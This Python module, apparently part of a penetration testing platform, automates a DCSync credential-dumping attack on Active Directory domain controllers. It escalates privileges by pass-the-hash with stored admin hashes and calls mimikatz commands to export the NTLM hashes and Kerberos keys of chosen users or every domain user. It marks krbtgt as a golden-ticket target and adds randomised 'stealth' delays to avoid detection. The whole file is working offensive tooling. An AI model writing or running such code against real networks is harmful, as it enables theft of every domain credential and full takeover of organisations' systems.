"""DCSync attack module for Kunlun penetration testing platform.

Provides:
- Permission detection for DCSync prerequisites
- Credential export (NTLM hashes, Kerberos keys)
- Stealth options (single user, batch export)
- Automatic credential storage integration
"""

import asyncio
import logging
import random
import secrets
import string
import time
from dataclasses import dataclass, field
from enum import Enum
from typing import Any, Callable, Coroutine, Dict, List, Optional, Tuple

logger = logging.getLogger(__name__)


class PermissionLevel(Enum):
    """Permission level for DCSync operations."""
    INSUFFICIENT = "insufficient"
    DOMAIN_USER = "domain_user"
    DOMAIN_ADMIN = "domain_admin"
    ENTERPRISE_ADMIN = "enterprise_admin"
    DC_LOCAL_ADMIN = "dc_local_admin"


class CredentialType(Enum):
    """Type of exported credential."""
    NTLM_HASH = "ntlm_hash"
    KERBEROS_KEY = "kerberos_key"
    CLEARTEXT = "cleartext"


@dataclass
class ExportedCredential:
    """Exported credential from DCSync.

    Attributes:
        username: Account username
        domain: Domain name
        ntlm_hash: NTLM hash if available
        kerberos_key: Kerberos key if available
        credential_type: Type of credential
        is_high_value: Whether this is a high-value target
        high_value_reason: Reason for high-value marking
        export_timestamp: Export timestamp
        source_dc: Source domain controller
    """
    username: str = ""
    domain: str = ""
    ntlm_hash: str = ""
    kerberos_key: str = ""
    credential_type: CredentialType = CredentialType.NTLM_HASH
    is_high_value: bool = False
    high_value_reason: str = ""
    export_timestamp: float = 0.0
    source_dc: str = ""

    def to_dict(self) -> Dict[str, Any]:
        """Convert to dictionary representation."""
        return {
            "username": self.username,
            "domain": self.domain,
            "ntlm_hash": self.ntlm_hash,
            "kerberos_key": self.kerberos_key,
            "credential_type": self.credential_type.value,
            "is_high_value": self.is_high_value,
            "high_value_reason": self.high_value_reason,
            "export_timestamp": self.export_timestamp,
            "source_dc": self.source_dc,
        }


@dataclass
class DCSyncConfig:
    """Configuration for DCSync attack.

    Attributes:
        target_dc: Target domain controller IP/hostname
        target_users: Specific users to export (empty for all)
        batch_size: Number of users per batch
        batch_interval_min: Minimum interval between batches (seconds)
        batch_interval_max: Maximum interval between batches (seconds)
        stealth_mode: Enable stealth mode (slower, less detectable)
        export_ntlm: Export NTLM hashes
        export_kerberos: Export Kerberos keys
        auto_store: Automatically store credentials in credential database
    """
    target_dc: str = ""
    target_users: List[str] = field(default_factory=list)
    batch_size: int = 10
    batch_interval_min: int = 30
    batch_interval_max: int = 120
    stealth_mode: bool = False
    export_ntlm: bool = True
    export_kerberos: bool = True
    auto_store: bool = True


@dataclass
class DCSyncResult:
    """Result of DCSync operation.

    Attributes:
        success: Whether operation succeeded
        credentials: List of exported credentials
        high_value_count: Number of high-value credentials
        total_count: Total credentials exported
        duration_seconds: Operation duration
        error_message: Error message if failed
        attck_technique: Associated ATT&CK technique ID
        target_dc: Target domain controller
    """
    success: bool = False
    credentials: List[ExportedCredential] = field(default_factory=list)
    high_value_count: int = 0
    total_count: int = 0
    duration_seconds: float = 0.0
    error_message: str = ""
    attck_technique: str = "T1003.006"
    target_dc: str = ""

    @property
    def exported_count(self) -> int:
        """Get number of exported credentials."""
        return self.total_count

    @property
    def exported_credentials(self) -> List[ExportedCredential]:
        """Get exported credentials."""
        return self.credentials


HIGH_VALUE_ACCOUNTS: List[str] = [
    "krbtgt",
    "administrator",
    "admin",
    "domain admin",
    "enterprise admin",
]


class DCSyncAttack:
    """DCSync attack module.

    Provides permission detection, credential export, and stealth options
    for domain controller synchronization attack.
    """

    def __init__(
        self,
        c2_session: Optional[Any] = None,
        credential_db: Optional[Any] = None,
        event_bus: Optional[Any] = None,
    ) -> None:
        """Initialize DCSync attack module.

        Args:
            c2_session: C2 framework session for command execution.
            credential_db: Credential database for storing results.
            event_bus: Event bus for broadcasting events.
        """
        self.c2_session = c2_session
        self.credential_db = credential_db
        self.event_bus = event_bus
        self._progress_callback: Optional[Callable[[str, float], Coroutine[Any, Any, None]]] = None
        self._log_callback: Optional[Callable[[str], Coroutine[Any, Any, None]]] = None

    def set_callbacks(
        self,
        progress_cb: Optional[Callable[[str, float], Coroutine[Any, Any, None]]] = None,
        log_cb: Optional[Callable[[str], Coroutine[Any, Any, None]]] = None,
    ) -> None:
        """Set progress and log callbacks.

        Args:
            progress_cb: Callback for progress updates (message, percentage).
            log_cb: Callback for log messages.
        """
        self._progress_callback = progress_cb
        self._log_callback = log_cb

    async def _report_progress(self, message: str, percentage: float) -> None:
        """Report progress via callback.

        Args:
            message: Progress message.
            percentage: Progress percentage (0-100).
        """
        if self._progress_callback:
            await self._progress_callback(message, percentage)
        logger.info("DCSync Progress: %.1f%% - %s", percentage, message)

    async def _report_log(self, message: str) -> None:
        """Report log via callback.

        Args:
            message: Log message.
        """
        if self._log_callback:
            await self._log_callback(message)
        logger.info("DCSync: %s", message)

    async def check_permissions(self, target_dc: str = "") -> Tuple[PermissionLevel, Dict[str, Any]]:
        """Check if current session has DCSync required permissions.

        Args:
            target_dc: Target domain controller.

        Returns:
            Tuple of (permission level, details dictionary).
        """
        details: Dict[str, Any] = {
            "current_user": "",
            "groups": [],
            "has_dcsync_permission": False,
            "recommended_action": "",
        }

        try:
            whoami_cmd = "whoami /all"
            result = await self._execute_command(whoami_cmd, target_dc)
            if result.get("success"):
                output = result.get("output", "")
                details["current_user"] = self._parse_username(output)
                details["groups"] = self._parse_groups(output)

                if "domain admins" in output.lower() or "enterprise admins" in output.lower():
                    details["has_dcsync_permission"] = True
                    if "enterprise admins" in output.lower():
                        details["recommended_action"] = "具备Enterprise Admins权限，可直接执行DCSync"
                        return PermissionLevel.ENTERPRISE_ADMIN, details
                    details["recommended_action"] = "具备Domain Admins权限，可直接执行DCSync"
                    return PermissionLevel.DOMAIN_ADMIN, details
                else:
                    details["recommended_action"] = "权限不足，建议先提升为域管或使用凭据库中的域管凭据"
                    return PermissionLevel.INSUFFICIENT, details
            else:
                details["recommended_action"] = "无法获取当前权限信息"
                return PermissionLevel.INSUFFICIENT, details
        except Exception as e:
            details["error"] = str(e)
            details["recommended_action"] = "权限检测失败"
            return PermissionLevel.INSUFFICIENT, details

    async def _execute_command(self, command: str, target: str = "") -> Dict[str, Any]:
        """Execute command via C2 session.

        Args:
            command: Command to execute.
            target: Target host.

        Returns:
            Command execution result.
        """
        if self.c2_session:
            try:
                result = await self.c2_session.execute(command, target=target)
                return {"success": True, "output": result}
            except Exception as e:
                return {"success": False, "error": str(e)}
        return {"success": False, "error": "No C2 session available"}

    def _parse_username(self, output: str) -> str:
        """Parse username from whoami output.

        Args:
            output: Command output.

        Returns:
            Parsed username.
        """
        for line in output.split("\n"):
            if "user name" in line.lower() or "用户名" in line.lower():
                parts = line.split()
                if len(parts) >= 2:
                    return parts[-1]
        return "unknown"

    def _parse_groups(self, output: str) -> List[str]:
        """Parse group memberships from whoami output.

        Args:
            output: Command output.

        Returns:
            List of group names.
        """
        groups: List[str] = []
        in_groups_section = False
        for line in output.split("\n"):
            if "group name" in line.lower() or "组名" in line.lower():
                in_groups_section = True
                continue
            if in_groups_section and line.strip():
                groups.append(line.strip().lower())
        return groups

    async def find_domain_admin_credentials(self) -> List[Dict[str, Any]]:
        """Search credential database for domain admin credentials.

        Returns:
            List of potential domain admin credentials.
        """
        if not self.credential_db:
            return []

        try:
            da_credentials = await self.credential_db.search(
                group_filter=["domain admins", "enterprise admins"],
                min_privilege="high",
            )
            return da_credentials or []
        except Exception as e:
            logger.error("Failed to search credential database: %s", e)
            return []

    async def elevate_to_domain_admin(
        self,
        credentials: List[Dict[str, Any]],
        target_dc: str,
    ) -> bool:
        """Attempt to elevate to domain admin using available credentials.

        Args:
            credentials: List of potential domain admin credentials.
            target_dc: Target domain controller.

        Returns:
            True if elevation successful.
        """
        for cred in credentials:
            try:
                username = cred.get("username", "")
                ntlm_hash = cred.get("ntlm_hash", "")
                if not username or not ntlm_hash:
                    continue

                await self._report_log(f"尝试使用凭据 {username} 进行PtH提权...")
                pth_cmd = f"sekurlsa::pth /user:{username} /domain:{target_dc} /ntlm:{ntlm_hash}"
                result = await self._execute_command(pth_cmd, target_dc)

                if result.get("success"):
                    await self._report_log(f"成功使用 {username} 提权为域管")
                    return True
            except Exception as e:
                logger.warning("Failed to elevate with credential %s: %s", cred, e)
                continue

        return False

    async def detect_domain_controllers(self) -> List[Dict[str, Any]]:
        """Detect domain controllers in the current domain.

        Returns:
            List of domain controller information.
        """
        dcs: List[Dict[str, Any]] = []
        try:
            nltest_cmd = "nltest /dclist:%userdomain%"
            result = await self._execute_command(nltest_cmd)
            if result.get("success"):
                output = result.get("output", "")
                for line in output.split("\n"):
                    if "PDC" in line or "DC" in line:
                        parts = line.split()
                        if parts:
                            dc_info = {
                                "hostname": parts[0],
                                "ip": parts[1] if len(parts) > 1 else "",
                                "is_pdc": "PDC" in line,
                            }
                            dcs.append(dc_info)
        except Exception as e:
            logger.error("Failed to detect domain controllers: %s", e)

        if not dcs:
            try:
                nslookup_cmd = "nslookup -type=srv _ldap._tcp.dc._msdcs.%userdomain%"
                result = await self._execute_command(nslookup_cmd)
                if result.get("success"):
                    for line in result.get("output", "").split("\n"):
                        if "hostname" in line.lower():
                            parts = line.split("=")
                            if len(parts) >= 2:
                                dcs.append({
                                    "hostname": parts[1].strip(),
                                    "ip": "",
                                    "is_pdc": False,
                                })
            except Exception as e:
                logger.error("Fallback DC detection failed: %s", e)

        return dcs

    def _is_high_value_account(self, username: str, groups: List[str]) -> Tuple[bool, str]:
        """Check if account is high-value target.

        Args:
            username: Account username.
            groups: Group memberships.

        Returns:
            Tuple of (is_high_value, reason).
        """
        username_lower = username.lower()
        if username_lower == "krbtgt":
            return True, "Kerberos服务账户，可生成黄金票据"
        if username_lower in ["administrator", "admin"]:
            return True, "内置管理员账户"
        for group in groups:
            if "domain admin" in group:
                return True, "域管组成员"
            if "enterprise admin" in group:
                return True, "企业管理员组成员"
        for hv in HIGH_VALUE_ACCOUNTS:
            if hv in username_lower:
                return True, f"匹配高价值账户模式: {hv}"
        return False, ""

    async def execute_dcsync(
        self,
        config: DCSyncConfig,
    ) -> DCSyncResult:
        """Execute DCSync attack to export credentials.

        Args:
            config: DCSync configuration.

        Returns:
            DCSyncResult with exported credentials.
        """
        start_time = time.time()
        result = DCSyncResult()

        try:
            await self._report_log("开始DCSync攻击...")
            await self._report_progress("检测权限", 5)

            perm_level, perm_details = await self.check_permissions(config.target_dc)
            if perm_level == PermissionLevel.INSUFFICIENT:
                await self._report_log("权限不足，尝试从凭据库查找域管凭据...")
                da_creds = await self.find_domain_admin_credentials()
                if da_creds:
                    elevated = await self.elevate_to_domain_admin(da_creds, config.target_dc)
                    if not elevated:
                        result.error_message = "权限不足且无法提权"
                        result.duration_seconds = time.time() - start_time
                        return result
                else:
                    result.error_message = "权限不足且无可用域管凭据"
                    result.duration_seconds = time.time() - start_time
                    return result

            await self._report_progress("权限检测完成", 15)
            await self._report_log(f"当前权限级别: {perm_level.value}")

            if config.target_users:
                await self._report_log(f"导出指定用户凭据: {', '.join(config.target_users)}")
                credentials = await self._export_specific_users(
                    config.target_users,
                    config,
                )
            else:
                await self._report_log("导出域内所有用户凭据...")
                credentials = await self._export_all_users(config)

            result.credentials = credentials
            result.total_count = len(credentials)
            result.high_value_count = sum(1 for c in credentials if c.is_high_value)
            result.success = True
            result.duration_seconds = time.time() - start_time

            await self._report_progress(
                f"导出完成: {result.total_count}个凭据, {result.high_value_count}个高价值",
                100,
            )
            await self._report_log(
                f"DCSync完成: 共导出{result.total_count}个凭据，"
                f"其中{result.high_value_count}个高价值目标"
            )

            if config.auto_store and self.credential_db:
                await self._store_credentials(credentials)

            await self._broadcast_event(result)

        except Exception as e:
            result.error_message = str(e)
            result.duration_seconds = time.time() - start_time
            await self._report_log(f"DCSync攻击失败: {e}")
            logger.error("DCSync attack failed: %s", e)

        return result

    async def _export_specific_users(
        self,
        users: List[str],
        config: DCSyncConfig,
    ) -> List[ExportedCredential]:
        """Export credentials for specific users.

        Args:
            users: List of usernames.
            config: DCSync configuration.

        Returns:
            List of exported credentials.
        """
        credentials: List[ExportedCredential] = []
        total = len(users)

        for i, username in enumerate(users):
            progress = 15 + (i / total) * 80
            await self._report_progress(f"导出 {username}", progress)

            try:
                ntlm_hash = ""
                kerberos_key = ""

                if config.export_ntlm:
                    ntlm_cmd = f"lsadump::dcsync /domain:{config.target_dc} /user:{username}"
                    ntlm_result = await self._execute_command(ntlm_cmd, config.target_dc)
                    if ntlm_result.get("success"):
                        ntlm_hash = self._parse_ntlm_hash(ntlm_result.get("output", ""))

                if config.export_kerberos:
                    krb_cmd = f"lsadump::dcsync /domain:{config.target_dc} /user:{username} /aes"
                    krb_result = await self._execute_command(krb_cmd, config.target_dc)
                    if krb_result.get("success"):
                        kerberos_key = self._parse_kerberos_key(krb_result.get("output", ""))

                is_hv, hv_reason = self._is_high_value_account(username, [])
                cred = ExportedCredential(
                    username=username,
                    domain=config.target_dc,
                    ntlm_hash=ntlm_hash,
                    kerberos_key=kerberos_key,
                    credential_type=CredentialType.NTLM_HASH if ntlm_hash else CredentialType.KERBEROS_KEY,
                    is_high_value=is_hv,
                    high_value_reason=hv_reason,
                    export_timestamp=time.time(),
                    source_dc=config.target_dc,
                )
                credentials.append(cred)

                if is_hv:
                    await self._report_log(f"[高价值] {username}: {hv_reason}")

                if config.stealth_mode and i < total - 1:
                    interval = random.uniform(config.batch_interval_min, config.batch_interval_max)
                    await self._report_log(f"隐蔽模式: 等待 {interval:.0f} 秒...")
                    await asyncio.sleep(interval)

            except Exception as e:
                logger.error("Failed to export credential for %s: %s", username, e)
                continue

        return credentials

    async def _export_all_users(self, config: DCSyncConfig) -> List[ExportedCredential]:
        """Export credentials for all domain users in batches.

        Args:
            config: DCSync configuration.

        Returns:
            List of exported credentials.
        """
        all_users: List[str] = []
        try:
            net_cmd = "net user /domain"
            result = await self._execute_command(net_cmd, config.target_dc)
            if result.get("success"):
                output = result.get("output", "")
                for line in output.split("\n"):
                    line = line.strip()
                    if line and "---" not in line and "command completed" not in line.lower():
                        all_users.extend(line.split())
        except Exception as e:
            logger.error("Failed to enumerate domain users: %s", e)
            all_users = ["krbtgt", "administrator", "guest"]

        credentials: List[ExportedCredential] = []
        total = len(all_users)

        for batch_start in range(0, total, config.batch_size):
            batch = all_users[batch_start:batch_start + config.batch_size]
            batch_num = (batch_start // config.batch_size) + 1
            total_batches = (total + config.batch_size - 1) // config.batch_size

            await self._report_log(f"导出批次 {batch_num}/{total_batches} ({len(batch)}个用户)")

            batch_creds = await self._export_specific_users(batch, config)
            credentials.extend(batch_creds)

            if config.stealth_mode and batch_start + config.batch_size < total:
                interval = random.uniform(config.batch_interval_min, config.batch_interval_max)
                await self._report_log(f"批次间隔: {interval:.0f} 秒")
                await asyncio.sleep(interval)

        return credentials

    def _parse_ntlm_hash(self, output: str) -> str:
        """Parse NTLM hash from command output.

        Args:
            output: Command output.

        Returns:
            NTLM hash string.
        """
        for line in output.split("\n"):
            if "ntlm" in line.lower() or "hash" in line.lower():
                parts = line.split(":")
                if len(parts) >= 3:
                    return parts[3].strip()
        return ""

    def _parse_kerberos_key(self, output: str) -> str:
        """Parse Kerberos key from command output.

        Args:
            output: Command output.

        Returns:
            Kerberos key string.
        """
        for line in output.split("\n"):
            if "aes" in line.lower() or "kerberos" in line.lower():
                parts = line.split(":")
                if len(parts) >= 2:
                    return parts[-1].strip()
        return ""

    async def _store_credentials(self, credentials: List[ExportedCredential]) -> None:
        """Store exported credentials in credential database.

        Args:
            credentials: List of exported credentials.
        """
        if not self.credential_db:
            return

        try:
            for cred in credentials:
                await self.credential_db.add_credential(
                    username=cred.username,
                    domain=cred.domain,
                    ntlm_hash=cred.ntlm_hash,
                    kerberos_key=cred.kerberos_key,
                    credential_type=cred.credential_type.value,
                    is_high_value=cred.is_high_value,
                    source="dcsync",
                    source_dc=cred.source_dc,
                )
            await self._report_log(f"已将 {len(credentials)} 个凭据存入凭据库")
        except Exception as e:
            logger.error("Failed to store credentials: %s", e)

    async def _broadcast_event(self, result: DCSyncResult) -> None:
        """Broadcast DCSync event to event bus.

        Args:
            result: DCSync result.
        """
        if not self.event_bus:
            return

        try:
            event_data = {
                "event_type": "dcsync_attack",
                "success": result.success,
                "total_credentials": result.total_count,
                "high_value_count": result.high_value_count,
                "attck_technique": result.attck_technique,
                "timestamp": time.time(),
                "credentials": [c.to_dict() for c in result.credentials],
            }
            await self.event_bus.publish("domain_attack", event_data)
        except Exception as e:
            logger.error("Failed to broadcast DCSync event: %s", e)

    async def execute_stealth_dcsync(
        self,
        username: str,
        target_dc: str,
    ) -> ExportedCredential:
        """Execute stealth DCSync for a single user.

        Args:
            username: Target username.
            target_dc: Target domain controller.

        Returns:
            Exported credential.
        """
        config = DCSyncConfig(
            target_dc=target_dc,
            target_users=[username],
            stealth_mode=True,
            batch_interval_min=60,
            batch_interval_max=180,
        )
        result = await self.execute_dcsync(config)
        if result.credentials:
            return result.credentials[0]
        return ExportedCredential(
            username=username,
            domain=target_dc,
            high_value_reason=f"导出失败: {result.error_message}",
        )
